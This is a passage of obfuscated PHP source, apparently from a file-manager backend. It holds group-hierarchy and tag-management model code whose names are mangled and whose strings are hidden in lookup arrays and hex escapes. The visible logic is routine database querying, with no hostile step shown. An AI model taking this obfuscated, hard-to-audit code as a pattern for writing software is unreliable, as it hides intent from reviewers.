$òœ¶ıÒÀ[1900], $×¶üˆÖ“); $ÜøíúºÉ = Input::get($òœ¶ıÒÀ[507], $òœ¶ıÒÀ[7], $òœ¶ıÒÀ[1987], array($òœ¶ıÒÀ[1987], $òœ¶ıÒÀ[501])); $ÜøíúºÉ = $ÅİùØñÄ[$ÜøíúºÉ]; $·ïÄİğ¨ = $·ïÄİğ¨ . "{$ßå¢ÔÛ‡}\x20{$ÜøíúºÉ}\x2c\x20\147\x72\x6f\165\x70\x49\104\x20\141\163\143"; return $this->order($·ïÄİğ¨); } public function listChild($ƒŠ¡à¿­) { $¦ğÜñöı =& $_SERVER[ˆûùúÊ¯]; $ÇËß È = $this->where(array($¦ğÜñöı[189] => $ƒŠ¡à¿­))->_makeOrder()->selectPage(200); $this->_listDataApply($ÇËß È[$¦ğÜñöı[421]]); return $ÇËß È; } public function listChildIds($úò÷Œ¯—) { $ó­£¯ÁÜ =& $_SERVER[ˆûùúÊ¯]; if (is_string($‹æ…·Í›)) { $úò÷Œ¯— = explode($ó­£¯ÁÜ[60], $úò÷Œ¯—); } $ºÖ»¾Ÿ· = $this->where(array($ó­£¯ÁÜ[1896] => array($ó­£¯ÁÜ[7], $úò÷Œ¯—)))->field($ó­£¯ÁÜ[1988])->select(); if (!$ºÖ»¾Ÿ·) { return !1; } $“­Óô§ò = array(); foreach ($ºÖ»¾Ÿ· as $´¦ŸŒ§—) { $“­Óô§ò[] = "\x73\145\154\x65\143\x74\x20\x67\x72\157\x75\160\x49\x44\x20\x66\162\157\x6d\40\x60\147\162\x6f\165\160\x60\x20\x77\150\x65\162\x65\40\160\x61\x72\x65\156\164\x4c\145\166\145\154\x20\x6c\151\x6b\145\40\47{$´¦ŸŒ§—[$ó­£¯ÁÜ[561]]}{$´¦ŸŒ§—[$ó­£¯ÁÜ[1896]]}\x2c\45\x27"; } $“­Óô§ò = implode($ó­£¯ÁÜ[1989], $“­Óô§ò); $ºÖ»¾Ÿ· = $this->query($“­Óô§ò); if (!$ºÖ»¾Ÿ·) { return array(); } $úò÷Œ¯— = array_to_keyvalue($ºÖ»¾Ÿ·, $ó­£¯ÁÜ[12], $ó­£¯ÁÜ[1896]); return array_unique($úò÷Œ¯—); } public function listByID($üÒÛ’Íµ) { $‰¶‡ô =& $_SERVER[ˆûùúÊ¯]; if (!$üÒÛ’Íµ) { return array(); } $ãñ¿ïï = array($‰¶‡ô[1896] => array($‰¶‡ô[7], $üÒÛ’Íµ)); $İ²†œ± = $this->where($ãñ¿ïï)->select(); $İ²†œ± = array_sort_keep($İ²†œ±, $‰¶‡ô[1896], $üÒÛ’Íµ); $this->_listDataApply($İ²†œ±); return $İ²†œ±; } public function listSearch($”µ×ŠÚ) { $ÄõÉÑ²§ =& $_SERVER[ˆûùúÊ¯]; $…š¨øìğ = $”µ×ŠÚ[$ÄõÉÑ²§[1990]]; $Èõ°Éé… = isset($”µ×ŠÚ[$ÄõÉÑ²§[1991]]) ? $”µ×ŠÚ[$ÄõÉÑ²§[1991]] : !1; if (!trim($…š¨øìğ)) { return !1; } $…š¨øìğ = str_replace($ÄõÉÑ²§[1992], $ÄõÉÑ²§[1993], $…š¨øìğ); $ÓÄŒİ˜ı = array($ÄõÉÑ²§[1896] => array($ÄõÉÑ²§[435], "{$…š¨øìğ}\45"), $ÄõÉÑ²§[42] => array($ÄõÉÑ²§[435], "\45{$…š¨øìğ}\x25"), $ÄõÉÑ²§[1061] => $ÄõÉÑ²§[1994]); if ($Èõ°Éé…) { $²ÀÄ«…À = $this->getInfoSimple($Èõ°Éé…); $ş¼®…¸Ê = $²ÀÄ«…À[$ÄõÉÑ²§[561]] . $Èõ°Éé… . $ÄõÉÑ²§[589]; $ÓÄŒİ˜ı = array($ÓÄŒİ˜ı, array($ÄõÉÑ²§[561] => array($ÄõÉÑ²§[435], $ş¼®…¸Ê))); } $ÓÄŒİ˜ı = $this->parseWhereLike($ÓÄŒİ˜ı); $Ãìä¿• = $this->_makeOrder()->where($ÓÄŒİ˜ı)->selectPage(20); $Ãìä¿• = $Ãìä¿• ? $Ãìä¿• : array($ÄõÉÑ²§[421] => array(), $ÄõÉÑ²§[418] => array()); if (!$Ãìä¿• || count($Ãìä¿•[$ÄõÉÑ²§[421]]) < 5 && Input::check($…š¨øìğ, $ÄõÉÑ²§[370])) { $†±Ä¸ª = $this->groupChildrenAll($Èõ°Éé…); $ºí¹ä–§ = $this->_searchFromMeta($ÄõÉÑ²§[513], $…š¨øìğ, 10, $†±Ä¸ª); $÷Ë™®Û¯ = $this->_searchFromMeta($ÄõÉÑ²§[514], $…š¨øìğ, 10, $†±Ä¸ª); $ºÕĞ¡  = array_merge($ºí¹ä–§, $÷Ë™®Û¯, $Ãìä¿•[$ÄõÉÑ²§[421]]); $Ãìä¿•[$ÄõÉÑ²§[421]] = array_unique_by_key($ºÕĞ¡ , $ÄõÉÑ²§[1896]); $Ãìä¿•[$ÄõÉÑ²§[418]][$ÄõÉÑ²§[419]] = count($Ãìä¿•[$ÄõÉÑ²§[421]]); $Ãìä¿•[$ÄõÉÑ²§[418]][$ÄõÉÑ²§[420]] = ceil($Ãìä¿•[$ÄõÉÑ²§[418]][$ÄõÉÑ²§[419]] / $Ãìä¿•[$ÄõÉÑ²§[418]][$ÄõÉÑ²§[415]]); } $this->_listDataApply($Ãìä¿•[$ÄõÉÑ²§[421]]); return $Ãìä¿•; } protected function groupChildrenAll($Ü°¦¡º´) { $ò˜¬²™¨ =& $_SERVER[ˆûùúÊ¯]; if (!$Ü°¦¡º´) { return !1; } if (is_string($Ü°¦¡º´)) { $Ü°¦¡º´ = array($Ü°¦¡º´); } $È¹ÚËÈµ = $Ü°¦¡º´; foreach ($Ü°¦¡º´ as $ïƒ²¤¾) { $™ˆßË×À = $this->getInfoSimple($ïƒ²¤¾); $Œ­™«ƒ = array($ò˜¬²™¨[561] => array($ò˜¬²™¨[435], $™ˆßË×À[$ò˜¬²™¨[561]] . $ïƒ²¤¾ . $ò˜¬²™¨[589])); $ÍßãÒ = $this->field($ò˜¬²™¨[1896])->where($Œ­™«ƒ)->select(); $È¹ÚËÈµ = array_merge($È¹ÚËÈµ, array_to_keyvalue($ÍßãÒ, $ò˜¬²™¨[12], $ò˜¬²™¨[1896])); } return array_unique($È¹ÚËÈµ); } private function _searchFromMeta($¼˜³‹œ¬, $²º‘ÒÁë, $”ÇóşÕĞ, $îÃÆƒÚ) { $§¯„ÇÇ =& $_SERVER[ˆûùúÊ¯]; $²º‘ÒÁë = strtolower($²º‘ÒÁë); $ õìéıï = array($§¯„ÇÇ[104] => $¼˜³‹œ¬, $§¯„ÇÇ[426] => array($§¯„ÇÇ[435], "\45{$²º‘ÒÁë}\x25")); $ õìéıï = $this->parseWhereLike($ õìéıï); if ($îÃÆƒÚ) { $ õìéıï[$§¯„ÇÇ[1896]] = array($§¯„ÇÇ[7], $îÃÆƒÚ); } $¾Õ•›ãˆ = Model($§¯„ÇÇ[1995])->where($ õìéıï)->limit($”ÇóşÕĞ)->select(); if (!$¾Õ•›ãˆ) { return array(); } $¾Õ•›ãˆ = array_to_keyvalue($¾Õ•›ãˆ, $§¯„ÇÇ[12], $§¯„ÇÇ[1896]); $€ÒôÉõ = $this->where(array($§¯„ÇÇ[1984] => array($§¯„ÇÇ[7], $¾Õ•›ãˆ)))->select(); if (!$€ÒôÉõ) { return array(); } return $€ÒôÉõ; } protected function _listDataApplyItem($‚Ş‚«ò¹) { $·¹ ¼ò± = array($‚Ş‚«ò¹); $this->_listDataApply($·¹ ¼ò±); return $·¹ ¼ò±[0]; } protected function _listDataApply(&$ÁˆÜ¶ãÛ) { $µàÏÛÕ¡ =& $_SERVER[ˆûùúÊ¯]; if (!$ÁˆÜ¶ãÛ) { return; } $ö¯Â‡·ã = array_to_keyvalue($ÁˆÜ¶ãÛ, $µàÏÛÕ¡[12], $µàÏÛÕ¡[1896]); $this->_listAppendChildren($ÁˆÜ¶ãÛ); $this->_listAppendChildrenMember($ÁˆÜ¶ãÛ); $this->_listAppendMeta($ÁˆÜ¶ãÛ, $ö¯Â‡·ã); $this->_listAppendParent($ÁˆÜ¶ãÛ); $this->_listAppendSourceRoot($ÁˆÜ¶ãÛ, $ö¯Â‡·ã); } private function _listAppendChildren(&$Ó¯›Ò·) { $¥¦¼•«¸ =& $_SERVER[ˆûùúÊ¯]; $Û§¨Ÿß = array_to_keyvalue($Ó¯›Ò·, $¥¦¼•«¸[12], $¥¦¼•«¸[1896]); $‚ƒ¨Âù› = array($¥¦¼•«¸[189] => array($¥¦¼•«¸[7], $Û§¨Ÿß)); $¨ùı„‹¶ = array($¥¦¼•«¸[189], $¥¦¼•«¸[1996] => $¥¦¼•«¸[541]); $§ƒ¢îøè = $this->field($¨ùı„‹¶)->where($‚ƒ¨Âù›)->group($¥¦¼•«¸[189])->select(); $°‰°ŸÄ = array_to_keyvalue($§ƒ¢îøè, $¥¦¼•«¸[189], $¥¦¼•«¸[541]); foreach ($Ó¯›Ò· as &$¤¿éÉ¯é) { $Àª™ªı‰ = $¤¿éÉ¯é[$¥¦¼•«¸[1896]]; $¤¿éÉ¯é[$¥¦¼•«¸[1997]] = isset($°‰°ŸÄ[$Àª™ªı‰]) ? intval($°‰°ŸÄ[$Àª™ªı‰]) : !1; } unset($¤¿éÉ¯é); } private function _listAppendChildrenMember(&$¯•¢¬úø) { $õéòóÆ² =& $_SERVER[ˆûùúÊ¯]; $ğâ°›áœ = array_to_keyvalue($¯•¢¬úø, $õéòóÆ²[12], $õéòóÆ²[1896]); $éš¿Ç = array($õéòóÆ²[1896] => array($õéòóÆ²[7], $ğâ°›áœ)); $¹µã¼Çò = array($õéòóÆ²[1896], $õéòóÆ²[1996] => $õéòóÆ²[541]); $è¹Á€¥¡ = Model($õéòóÆ²[1986])->field($¹µã¼Çò)->where($éš¿Ç)->group($õéòóÆ²[1896])->select(); $¡ºÁÄÓ = array_to_keyvalue($è¹Á€¥¡, $õéòóÆ²[1896], $õéòóÆ²[541]); foreach ($¯•¢¬úø as &$’ò€ô—) { $Ò¢®‰úÉ = $’ò€ô—[$õéòóÆ²[1896]]; $’ò€ô—[$õéòóÆ²[1998]] = isset($¡ºÁÄÓ[$Ò¢®‰úÉ]) ? intval($¡ºÁÄÓ[$Ò¢®‰úÉ]) : !1; } unset($’ò€ô—); } private function _listAppendMeta(&$¨Ğıà›‚, $ûâïÉ¨) { $¿øŸÒ£× =& $_SERVER[ˆûùúÊ¯]; $×–ªÄÔ÷ = array($¿øŸÒ£×[1896] => array($¿øŸÒ£×[7], $ûâïÉ¨)); $Ñ‰…ÍÓ = Model($¿øŸÒ£×[1985])->where($×–ªÄÔ÷)->select(); $Ñ‰…ÍÓ = array_to_keyvalue_group($Ñ‰…ÍÓ, $¿øŸÒ£×[1896]); foreach ($Ñ‰…ÍÓ as &$Íòë¤¢±) { $Íòë¤¢± = array_to_keyvalue($Íòë¤¢±, $¿øŸÒ£×[104], $¿øŸÒ£×[426]); } unset($Íòë¤¢±); foreach ($¨Ğıà›‚ as &$»Šº¸„µ) { $»Šº¸„µ[$¿øŸÒ£×[515]] = array(); if (isset($Ñ‰…ÍÓ[$»Šº¸„µ[$¿øŸÒ£×[1896]]])) { $»Šº¸„µ[$¿øŸÒ£×[515]] = $Ñ‰…ÍÓ[$»Šº¸„µ[$¿øŸÒ£×[1896]]]; } } unset($»Šº¸„µ); } protected function parentLevelArray($¨ºÚÇïÓ) { $¶ÍÑ±ê =& $_SERVER[ˆûùúÊ¯]; $¨ºÚÇïÓ = explode($¶ÍÑ±ê[60], trim($¨ºÚÇïÓ, $¶ÍÑ±ê[60])); $¨ºÚÇïÓ = array_remove_value($¨ºÚÇïÓ, $¶ÍÑ±ê[221]); return $¨ºÚÇïÓ; } protected function parentInGroup($÷¿ÜıÌØ, $ƒ±¤ª®¥) { $­Ò‘øÂù =& $_SERVER[ˆûùúÊ¯]; $”À«Î È = $this->getInfoSimple($÷¿ÜıÌØ); if (!$”À«Î È) { return !0; } $¹øİ¨¼ = $this->parentLevelArray($”À«Î È[$­Ò‘øÂù[561]]); $¹øİ¨¼[] = $÷¿ÜıÌØ; foreach ($¹øİ¨¼ as $÷¿ÜıÌØ) { if (in_array($÷¿ÜıÌØ . $­Ò‘øÂù[12], $ƒ±¤ª®¥)) { return !0; } } return !1; } private function _listAppendParent(&$ÈÆÜÁ•Â) { $ó¯Ïôıì =& $_SERVER[ˆûùúÊ¯]; $´ãº´€é = array(); foreach ($ÈÆÜÁ•Â as &$˜Âó÷×œ) { $´ãº´€é[$˜Âó÷×œ[$ó¯Ïôıì[1896]]] = $˜Âó÷×œ[$ó¯Ïôıì[42]]; $¾±¶§ş¶ = $this->parentLevelArray($˜Âó÷×œ[$ó¯Ïôıì[561]]); foreach ($¾±¶§ş¶ as $ˆõÁÔ•) { if (!isset($´ãº´€é[$ˆõÁÔ•])) { $´ãº´€é[$ˆõÁÔ•] = 0; } } } unset($˜Âó÷×œ); foreach ($´ãº´€é as $Ö±Çø£Ò => $Ğƒ‚íä) { if ($Ğƒ‚íä) { continue; } $Ü¢ü¨Ï = $this->getInfoSimple($Ö±Çø£Ò); $´ãº´€é[$Ö±Çø£Ò] = $Ü¢ü¨Ï[$ó¯Ïôıì[42]]; } $ŒÛ°œÓ = $GLOBALS[$ó¯Ïôıì[6]][$ó¯Ïôıì[99]][$ó¯Ïôıì[1999]]; if ($GLOBALS[$ó¯Ïôıì[544]] == $ó¯Ïôıì[98]) { $ŒÛ°œÓ = !1; } foreach ($ÈÆÜÁ•Â as &$˜Âó÷×œ) { $¾±¶§ş¶ = $this->parentLevelArray($˜Âó÷×œ[$ó¯Ïôıì[561]]); $ğÎ€“ö = $ó¯Ïôıì[12]; foreach ($¾±¶§ş¶ as $Ö±Çø£Ò => $ˆõÁÔ•) { if ($ŒÛ°œÓ && $Ö±Çø£Ò == 0) { continue; } $ğÎ€“ö .= $´ãº´€é[$ˆõÁÔ•] . $ó¯Ïôıì[8]; } if ($¾±¶§ş¶) { $ğÎ€“ö .= $˜Âó÷×œ[$ó¯Ïôıì[42]]; } $˜Âó÷×œ[$ó¯Ïôıì[566]] = str_replace($ó¯Ïôıì[569], $ó¯Ïôıì[8], $ğÎ€“ö); } unset($˜Âó÷×œ); } private function _listAppendSourceRoot(&$÷Ê±¿åà, $‚Úµ²óÓ) { $Œ“™Ãæ¼ =& $_SERVER[ˆûùúÊ¯]; $™Ö‘âú = Model($Œ“™Ãæ¼[885])->listSourceRoot(SourceModel::TYPE_GROUP, $‚Úµ²óÓ); $™Ö‘âú = array_to_keyvalue($™Ö‘âú, $Œ“™Ãæ¼[546]); $™Ö‘âú = array_remove_key($™Ö‘âú, $Œ“™Ãæ¼[546]); foreach ($÷Ê±¿åà as &$¢íü§Ç–) { $¢íü§Ç–[$Œ“™Ãæ¼[97]] = $™Ö‘âú[$¢íü§Ç–[$Œ“™Ãæ¼[1896]]] ? $™Ö‘âú[$¢íü§Ç–[$Œ“™Ãæ¼[1896]]] : array(); } unset($¢íü§Ç–); } protected function groupMerge($ì²§ô´§) { $ì²§ô´§ = array_values(array_unique($ì²§ô´§)); $¿øÁ’Æœ = array(); for ($¿‰Œœ›‘ = 0; $¿‰Œœ›‘ < count($ì²§ô´§); $¿‰Œœ›‘++) { $æúÕÑÛÀ = !1; for ($ó…—¤ƒä = 0; $ó…—¤ƒä < count($ì²§ô´§); $ó…—¤ƒä++) { if ($¿‰Œœ›‘ == $ó…—¤ƒä) { continue; } if ($this->isParentOf($ì²§ô´§[$ó…—¤ƒä], $ì²§ô´§[$¿‰Œœ›‘])) { $æúÕÑÛÀ = !0; break; } } if (!$æúÕÑÛÀ) { $¿øÁ’Æœ[] = $ì²§ô´§[$¿‰Œœ›‘]; } } return $¿øÁ’Æœ; } protected function isParentOf($š²±î, $°¸¶ğ¯) { $Ş²Å×íç =& $_SERVER[ˆûùúÊ¯]; if (!$š²±î || !$°¸¶ğ¯ || $š²±î == $°¸¶ğ¯) { return !1; } $ùÇÎ£¼‡ = $this->getInfoSimple($š²±î); $ß›Õ€ëŞ = $this->getInfoSimple($°¸¶ğ¯); $ÇıºÕÙ— = $ùÇÎ£¼‡[$Ş²Å×íç[561]] . $š²±î . $Ş²Å×íç[60]; if (substr($ß›Õ€ëŞ[$Ş²Å×íç[561]], 0, strlen($ÇıºÕÙ—)) == $ÇıºÕÙ—) { return !0; } return !1; } public function groupShowRoot($Àœºõõ­, $Ú¡èˆë¡ = false) { $ì´Ïª“µ =& $_SERVER[ˆûùúÊ¯]; $®ışé‚‘ = $this->getInfo($Àœºõõ­); if (!$®ışé‚‘) { return array(); } $“Á‰Ú–° = $this->parentLevelArray($®ışé‚‘[$ì´Ïª“µ[561]]); $ÏÔåšŞ = array($Àœºõõ­); if (count($“Á‰Ú–°) == 0) { return $ÏÔåšŞ; } if ($Ú¡èˆë¡ && count($“Á‰Ú–°) == 1) { return $ÏÔåšŞ; } if (!$®ışé‚‘[$ì´Ïª“µ[515]] || !isset($®ışé‚‘[$ì´Ïª“µ[515]][$ì´Ïª“µ[1982]]) || $®ışé‚‘[$ì´Ïª“µ[515]][$ì´Ïª“µ[1982]] == $ì´Ïª“µ[1951]) { return $this->groupShowRoot($“Á‰Ú–°[count($“Á‰Ú–°) - 1], $Ú¡èˆë¡); } if ($®ışé‚‘[$ì´Ïª“µ[515]][$ì´Ïª“µ[1982]] == $ì´Ïª“µ[409]) { $øø€×¿ = explode($ì´Ïª“µ[60], $®ışé‚‘[$ì´Ïª“µ[515]][$ì´Ïª“µ[1983]]); if ($øø€×¿) { $ÏÔåšŞ = array_merge($ÏÔåšŞ, $øø€×¿); } } return $ÏÔåšŞ; } protected function resetParentLevel() { $à•šöË =& $_SERVER[ˆûùúÊ¯]; $öĞ€“Ìã = $à•šöË[1896]; $õÉÑé±– = $this->select(); $õÉÑé±– = array_to_keyvalue($õÉÑé±–, $öĞ€“Ìã); foreach ($õÉÑé±– as $Å³ä°ŒÈ) { $È«¯«Åç = $Å³ä°ŒÈ; $¯›—ë = array(); while ($È«¯«Åç[$à•šöË[189]] != 0) { $¯›—ë[] = $È«¯«Åç[$à•šöË[189]]; $È«¯«Åç = $õÉÑé±–[$È«¯«Åç[$à•šöË[189]]]; } $¯›—ë[] = 0; $¯›—ë = $à•šöË[60] . implode($à•šöË[60], array_reverse($¯›—ë)) . $à•šöË[60]; $this->setNamePinyin($Å³ä°ŒÈ[$öĞ€“Ìã], $Å³ä°ŒÈ[$à•šöË[42]]); $this->where(array($öĞ€“Ìã => $Å³ä°ŒÈ[$öĞ€“Ìã]))->save(array($à•šöË[628] => $¯›—ë)); } return $õÉÑé±–; } public function groupNameAuto($—ŒÑ“¾, $”ê°üª¦) { $¨±ƒÓúó =& $_SERVER[ˆûùúÊ¯]; $ƒÊ“Î×ç = $this->where(array($¨±ƒÓúó[453] => $—ŒÑ“¾))->getField($¨±ƒÓúó[42], !0); if (!$ƒÊ“Î×ç || !in_array($”ê°üª¦, $ƒÊ“Î×ç)) { return $”ê°üª¦; } for ($½ûæŒ®û = 1; $½ûæŒ®û <= count($ƒÊ“Î×ç) + 1; $½ûæŒ®û++) { $Ş“Ëû‰ = $”ê°üª¦ . "\x28{$½ûæŒ®û}\x29"; if (!in_array($Ş“Ëû‰, $ƒÊ“Î×ç)) { return $Ş“Ëû‰; } } } public function groupSwitch($şÌÂº—Š, $ûÒÜ¬‹³) { $±ãÄ†Æ =& $_SERVER[ˆûùúÊ¯]; $Ù„ÓáÆŒ = array($±ãÄ†Æ[1896] => array($±ãÄ†Æ[7], array($şÌÂº—Š, $ûÒÜ¬‹³))); $âŸ‰àîÂ = $this->where($Ù„ÓáÆŒ)->select(); $âŸ‰àîÂ = array_to_keyvalue($âŸ‰àîÂ, $±ãÄ†Æ[1896]); if (!isset($âŸ‰àîÂ[$şÌÂº—Š]) || !isset($âŸ‰àîÂ[$ûÒÜ¬‹³]) || $âŸ‰àîÂ[$şÌÂº—Š][$±ãÄ†Æ[189]] == 0) { return !1; } $Ù„ÓáÆŒ = array($±ãÄ†Æ[1896] => $şÌÂº—Š); $Ë‹ùşÏê = Model($±ãÄ†Æ[1986])->where($Ù„ÓáÆŒ)->select(); if (!$Ë‹ùşÏê) { $Ë‹ùşÏê = array(); } foreach ($Ë‹ùşÏê as $ßÁ®¹¡) { $„€™Àåá = $ßÁ®¹¡[$±ãÄ†Æ[1704]]; $Ù„ÓáÆŒ = array($±ãÄ†Æ[1704] => $„€™Àåá, $±ãÄ†Æ[1896] => $ûÒÜ¬‹³); $¾©À¸€É = Model($±ãÄ†Æ[1986])->where($Ù„ÓáÆŒ)->find(); if (!$¾©À¸€É) { $ª¯ğ¹Ã = array($ûÒÜ¬‹³ => $ßÁ®¹¡[$±ãÄ†Æ[2000]]); Model($±ãÄ†Æ[575])->userGroupAdd($„€™Àåá, $ª¯ğ¹Ã); } Model($±ãÄ†Æ[575])->userGroupRemove($„€™Àåá, $şÌÂº—Š); } $Ù„ÓáÆŒ = array($±ãÄ†Æ[187] => 2, $±ãÄ†Æ[189] => 0, $±ãÄ†Æ[461] => 1, $±ãÄ†Æ[546] => array($±ãÄ†Æ[7], array($şÌÂº—Š, $ûÒÜ¬‹³))); $¼—êÔ©º = Model($±ãÄ†Æ[885])->where($Ù„ÓáÆŒ)->field($±ãÄ†Æ[2001])->select(); $¼—êÔ©º = array_to_keyvalue($¼—êÔ©º, $±ãÄ†Æ[546], $±ãÄ†Æ[190]); $·£Í³‘ = !empty($¼—êÔ©º[$şÌÂº—Š]) ? $¼—êÔ©º[$şÌÂº—Š] : !1; if ($·£Í³‘) { if (!$¼—êÔ©º[$ûÒÜ¬‹³]) { $¼—êÔ©º[$ûÒÜ¬‹³] = Model($±ãÄ†Æ[885])->groupRootAdd($ûÒÜ¬‹³); } $‡Ö¼ª½ = $¼—êÔ©º[$ûÒÜ¬‹³]; $Ù„ÓáÆŒ = array($±ãÄ†Æ[189] => $·£Í³‘); $¼—êÔ©º = Model($±ãÄ†Æ[885])->where($Ù„ÓáÆŒ)->field($±ãÄ†Æ[2002])->select(); if (!$¼—êÔ©º) { $¼—êÔ©º = array(); } Model($±ãÄ†Æ[885])->moveClearAuth = !1; foreach ($¼—êÔ©º as $âŞ±å¿Ö) { $¯Âï™×ë = $âŞ±å¿Ö[$±ãÄ†Æ[461]] == $±ãÄ†Æ[98] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($±ãÄ†Æ[885])->move($âŞ±å¿Ö[$±ãÄ†Æ[190]], $‡Ö¼ª½, $¯Âï™×ë); } Model($±ãÄ†Æ[885])->moveClearAuth = !0; $Ù„ÓáÆŒ = array($±ãÄ†Æ[187] => 2, $±ãÄ†Æ[546] => $şÌÂº—Š); $ÕÄ•Å½š = array($±ãÄ†Æ[546] => $ûÒÜ¬‹³); Model($±ãÄ†Æ[2003])->where($Ù„ÓáÆŒ)->save($ÕÄ•Å½š); Model($±ãÄ†Æ[2004])->where($Ù„ÓáÆŒ)->save($ÕÄ•Å½š); } $this->_changeChildLevel($âŸ‰àîÂ[$şÌÂº—Š], $âŸ‰àîÂ[$ûÒÜ¬‹³], !0); $this->where(array($±ãÄ†Æ[189] => $şÌÂº—Š))->save(array($±ãÄ†Æ[189] => $ûÒÜ¬‹³)); $this->_clearChildrenCache($âŸ‰àîÂ[$ûÒÜ¬‹³]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\162\x5f\146\x61\166"; protected function cacheFunctionAlias($‰¼ëÆ¹×) { $ÚöÄ†„° =& $_SERVER[ˆûùúÊ¯]; return array($ÚöÄ†„°[2005] => array($‰¼ëÆ¹×[0], $ÚöÄ†„°[2006]), $ÚöÄ†„°[2007] => array($‰¼ëÆ¹×[0], $ÚöÄ†„°[2008])); } protected function get($‚ßËø©ç) { $€š©À‰ =& $_SERVER[ˆûùúÊ¯]; $¶æ°°¡ = Model($€š©À‰[562])->metaGet($‚ßËø©ç, $€š©À‰[2009]); $‹µ˜¤µ“ = json_decode($¶æ°°¡, !0); return $‹µ˜¤µ“ ? $‹µ˜¤µ“ : array($€š©À‰[2010] => $€š©À‰[98], $€š©À‰[421] => array()); } protected function set($¸Ì áîç, $Öé–ş®ğ) { $Íì¡ìÉ‘ =& $_SERVER[ˆûùúÊ¯]; $Öé–ş®ğ = $Öé–ş®ğ ? $Öé–ş®ğ : array($Íì¡ìÉ‘[2010] => $Íì¡ìÉ‘[98], $Íì¡ìÉ‘[421] => array()); return Model($Íì¡ìÉ‘[562])->metaSet($¸Ì áîç, $Íì¡ìÉ‘[2009], json_encode($Öé–ş®ğ)); } protected function getByTagID($Å»‚£çš, $Ñ¿Ê×§Ñ) { $†óø§§ª =& $_SERVER[ˆûùúÊ¯]; if (!$Å»‚£çš || !$Ñ¿Ê×§Ñ) { return !1; } if (!Model($†óø§§ª[562])->getInfoSimple($Å»‚£çš)) { return !1; } $¿‹†ë½× = $this->get($Å»‚£çš); if (!$¿‹†ë½× || !isset($¿‹†ë½×[$†óø§§ª[421]])) { return !1; } $°ƒæ†Û = array_find_by_field($¿‹†ë½×[$†óø§§ª[421]], $†óø§§ª[451], $Ñ¿Ê×§Ñ); return is_array($°ƒæ†Û) ? $°ƒæ†Û : !1; } public function listSource($ƒè ß–³, $¥Şòİ†õ) { $´¼Ã¶°é =& $_SERVER[ˆûùúÊ¯]; if ($¥Şòİ†õ && !is_array($¥Şòİ†õ)) { $¥Şòİ†õ = array($¥Şòİ†õ); } $üÆŒ‡Ñì = $this->listData($ƒè ß–³); $ÑäÅı•“ = array(); foreach ($üÆŒ‡Ñì as $§Š»ğÆ¬) { $ÛÎÕÂ“ı = $§Š»ğÆ¬[$´¼Ã¶°é[94]]; if (!$ÛÎÕÂ“ı) { continue; } if (!isset($ÑäÅı•“[$ÛÎÕÂ“ı])) { $ÑäÅı•“[$ÛÎÕÂ“ı] = array(); } $ÑäÅı•“[$ÛÎÕÂ“ı][] = $§Š»ğÆ¬[$´¼Ã¶°é[476]]; } $ÑíàÎ­Î = array(); foreach ($ÑäÅı•“ as $…÷ùó± => $ŞŠòê¢‰) { $·²±Ûø¥ = !0; if (!$¥Şòİ†õ) { $ÑíàÎ­Î[] = $…÷ùó±; continue; } foreach ($¥Şòİ†õ as $šƒáÒÜ„) { if (!in_array($šƒáÒÜ„, $ŞŠòê¢‰)) { $·²±Ûø¥ = !1; break; } } if ($·²±Ûø¥) { $ÑíàÎ­Î[] = $…÷ùó±; } } if (!$ÑíàÎ­Î) { return array(); } $Š÷¼ğÀó = array($´¼Ã¶°é[467] => array($´¼Ã¶°é[468], $ÑíàÎ­Î), $´¼Ã¶°é[546] => $ƒè ß–³, $´¼Ã¶°é[187] => SourceModel::TYPE_GROUP); $À¤Î÷‰± = Model($´¼Ã¶°é[1393])->listSource($Š÷¼ğÀó); if (!$À¤Î÷‰± || count($ÑíàÎ­Î) == $À¤Î÷‰±[$´¼Ã¶°é[418]][$´¼Ã¶°é[419]]) { return $À¤Î÷‰±; } $òáÁÈ¾ = array(); $ºıĞñ“ó = array_to_keyvalue($À¤Î÷‰±[$´¼Ã¶°é[92]], $´¼Ã¶°é[12], $´¼Ã¶°é[190]); $İİŠ£´» = array_to_keyvalue($À¤Î÷‰±[$´¼Ã¶°é[93]], $´¼Ã¶°é[12], $´¼Ã¶°é[190]); $×ñÓø = array_merge($İİŠ£´», $ºıĞñ“ó); foreach ($ÑíàÎ­Î as $ÛÎÕÂ“ı) { if (!in_array($ÛÎÕÂ“ı, $×ñÓø)) { $òáÁÈ¾[] = $ÛÎÕÂ“ı; } } if ($òáÁÈ¾) { $this->removeBySource($ƒè ß–³, $òáÁÈ¾); } return $À¤Î÷‰±; } protected function listData($‡³¸Ë·Ğ) { $„›“‰ÆŞ =& $_SERVER[ˆûùúÊ¯]; $®è„¦Öƒ = array($„›“‰ÆŞ[1695] => 0, $„›“‰ÆŞ[533] => array($„›“‰ÆŞ[2011], 0), $„›“‰ÆŞ[472] => $„›“‰ÆŞ[2012] . $‡³¸Ë·Ğ); $ôÂø˜äğ = $„›“‰ÆŞ[2013]; $ËšøÆŒÛ = $this->field($ôÂø˜äğ)->where($®è„¦Öƒ)->order($„›“‰ÆŞ[2014])->select(); return $ËšøÆŒÛ ? $ËšøÆŒÛ : array(); } protected function addToTag($é¸”¨§­, $÷Îü«Şß, $…ìî„‹ç) { $ÇŠãş± =& $_SERVER[ˆûùúÊ¯]; if (!$this->getByTagID($é¸”¨§­, $…ìî„‹ç) || !$÷Îü«Şß) { return !1; } if (!Model($ÇŠãş±[885])->pathInfo($÷Îü«Şß)) { return !1; } $¬çĞ¢ = array($ÇŠãş±[1695] => 0, $ÇŠãş±[533] => $…ìî„‹ç, $ÇŠãş±[471] => $÷Îü«Şß, $ÇŠãş±[472] => $ÇŠãş±[2015] . $é¸”¨§­, $ÇŠãş±[470] => $ÇŠãş±[12], $ÇŠãş±[1900] => 0); if ($this->where($¬çĞ¢)->find()) { return !1; } return $this->add($¬çĞ¢); } protected function removeFromTag($ƒöœÄÃú, $ª©õĞ‘, $½ÌÍ±ª) { $ˆöÆÏø =& $_SERVER[ˆûùúÊ¯]; if (!$this->getByTagID($ƒöœÄÃú, $½ÌÍ±ª) || !$ª©õĞ‘) { return !1; } if (is_array($ª©õĞ‘)) { $ª©õĞ‘ = array($ˆöÆÏø[7], $ª©õĞ‘); } $«••“Ğ = array($ˆöÆÏø[1695] => 0, $ˆöÆÏø[533] => $½ÌÍ±ª, $ˆöÆÏø[472] => $ˆöÆÏø[2015] . $ƒöœÄÃú, $ˆöÆÏø[471] => $ª©õĞ‘); return $this->where($«••“Ğ)->delete(); } protected function removeByTag($¿¿äÀ¥Ô, 